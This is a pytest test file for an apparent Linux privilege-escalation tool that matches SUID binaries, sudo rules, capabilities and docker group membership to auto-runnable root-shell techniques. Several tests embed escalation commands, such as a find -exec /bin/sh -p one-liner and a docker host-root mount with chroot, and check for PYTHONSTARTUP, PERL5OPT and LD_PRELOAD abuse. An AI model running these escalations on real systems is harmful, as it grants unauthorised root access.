from binsuid.exploit.builtin import builtin_techniques_for
from binsuid.exploit.selector import attach_best_techniques, is_auto_runnable, select_best_technique
from binsuid.models import Finding, VectorType


def _finding(path: str, vector: VectorType, caps=None) -> Finding:
    return Finding(
        vector=vector,
        path=path,
        executable=path.rsplit("/", 1)[-1],
        capabilities=caps or [],
    )


def test_sqlite3_suid_builtin_auto():
    finding = _finding("/usr/bin/sqlite3", VectorType.SUID)
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "/bin/sh" in finding.best_technique.code


def test_suid_find_builtin_auto():
    finding = _finding("/usr/bin/find", VectorType.SUID)
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "/bin/sh" in finding.best_technique.code


def test_cap_setuid_python_auto():
    finding = _finding("/usr/bin/python3", VectorType.CAPABILITIES, ["CAP_SETUID"])
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "setuid(0)" in finding.best_technique.code


def test_manual_review_not_auto():
    from binsuid.models import Technique

    tech = Technique(
        executable="tar",
        function="manual-review",
        code="# review",
        context="capabilities",
    )
    assert not is_auto_runnable(tech)


def test_select_prefers_builtin():
    from binsuid.models import Technique

    builtin = Technique(
        executable="find",
        function="shell",
        code="/usr/bin/find . -exec /bin/sh -p \\; -quit",
        context="suid",
        metadata={"source": "builtin", "auto": True},
    )
    gtfobins = Technique(
        executable="find",
        function="file-read",
        code="find /path/to/file -exec cat {} \\;",
        context="suid",
    )
    best = select_best_technique([gtfobins, builtin])
    assert best.metadata["source"] == "builtin"


def test_sudo_git_builtin_auto():
    finding = Finding(
        vector=VectorType.SUDO,
        path="/usr/bin/git",
        executable="git",
        details="cmd=/usr/bin/git; runas=root; nopasswd=True; setenv=False; user=student",
        severity="high",
    )
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "sudo -n" in finding.best_technique.code
    assert "core.editor" in finding.best_technique.code


def test_sudo_sqlite3_builtin_auto():
    finding = Finding(
        vector=VectorType.SUDO,
        path="/usr/bin/sqlite3",
        executable="sqlite3",
        details="cmd=/usr/bin/sqlite3; runas=root; nopasswd=True; setenv=False; user=student",
        severity="high",
    )
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert ".shell /bin/sh" in finding.best_technique.code


def test_setenv_python3_pythonstartup_auto():
    finding = Finding(
        vector=VectorType.SUDO,
        path="/usr/bin/python3",
        executable="python3",
        details="cmd=/usr/bin/python3; runas=root; nopasswd=True; setenv=True; user=student",
        severity="critical",
    )
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "PYTHONSTARTUP" in finding.best_technique.code
    assert finding.best_technique.metadata.get("auto") is True


def test_setenv_perl5opt_auto():
    finding = Finding(
        vector=VectorType.SUDO,
        path="/usr/bin/perl",
        executable="perl",
        details="cmd=/usr/bin/perl /dev/null; runas=root; nopasswd=True; setenv=True; user=student",
        severity="critical",
    )
    finding.techniques = builtin_techniques_for(finding)
    codes = [t.code for t in finding.techniques]
    assert any("PERL5OPT" in c for c in codes)
    perl_setenv = next(t for t in finding.techniques if "PERL5OPT" in t.code)
    assert perl_setenv.metadata.get("auto") is True


def test_setenv_awk_ld_preload_auto():
    finding = Finding(
        vector=VectorType.SUDO,
        path="/usr/bin/awk",
        executable="awk",
        details="cmd=/usr/bin/awk; runas=root; nopasswd=True; setenv=True; user=student",
        severity="critical",
    )
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "LD_PRELOAD" in finding.best_technique.code
    assert "gcc" in finding.best_technique.code


def test_docker_group_builtin_auto():
    finding = Finding(
        vector=VectorType.GROUP,
        path="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        executable="docker",
        details="Docker group — mount host root via container",
        severity="high",
    )
    finding.techniques = builtin_techniques_for(finding)
    attach_best_techniques([finding])
    assert finding.is_exploitable
    assert "docker run" in finding.best_technique.code
    assert is_auto_runnable(finding.best_technique)
